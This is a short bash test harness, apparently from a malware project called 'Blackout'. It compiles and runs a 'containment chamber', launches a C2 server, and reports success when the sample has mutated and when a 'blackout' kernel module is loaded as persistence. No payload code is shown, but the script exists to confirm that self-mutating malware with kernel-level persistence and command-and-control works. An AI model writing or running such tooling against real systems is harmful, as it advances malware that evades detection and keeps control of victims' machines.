// Placeholder for test_harness.sh
#!/bin/bash
# Blackout Test Harness

# Enable core dumps
ulimit -c unlimited

# Create containment chamber
gcc containment_chamber.c -o containment_chamber

# Start C2 server
python3 controller/c2_server.py &

# Run in containment
./containment_chamber

# Verify destruction
if [ -f "blackout_mutated" ]; then
    echo "✅ Mutation successful"
else
    echo "❌ Mutation failed"
fi

# Check for persistence
if lsmod | grep -q blackout; then
    echo "✅ Persistence installed"
else
    echo "❌ Persistence failed"
fi